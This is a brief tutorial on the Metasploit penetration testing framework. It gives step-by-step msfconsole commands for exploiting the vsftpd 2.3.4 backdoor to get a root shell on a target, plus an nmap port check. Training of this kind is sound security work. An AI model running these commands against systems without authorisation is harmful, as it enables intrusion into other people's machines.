Metasploit

Overview: Metasploit is a popular penetration testing framework used to simulate attacks and test system security.
Example Exploit: Exploiting vsftpd 2.3.4 Backdoor (exploit/unix/ftp/vsftpd_234_backdoor)
Step-by-Step Guide:
  1. Start Metasploit: Open your terminal and type: sudo msfconsole
  2. Search for the Exploit: In Metasploit, type: search vsftpd
  3. Select the Exploit: Use the following command to load the exploit: 
    use exploit/unix/ftp/vsftpd_234_backdoor
  4. Set Target Options: Configure the necessary options:
    • RHOSTS: Set the target IP address: 
      set RHOSTS <target IP>
    • LHOST: Set your own local IP address (Kali machine): 
      set LHOST <your IP>
  5. Check the Payload: By default, Metasploit uses cmd/unix/interact as the payload.
  6. Run the Exploit: Execute the exploit with: 
    exploit
  7. Shell Access: If successful, you will get a root shell on the target machine.
Useful Commands:
  • Check Open Ports: nmap -p 21 <target IP>
  • Show Options: show options
  • Exit the Shell: exit
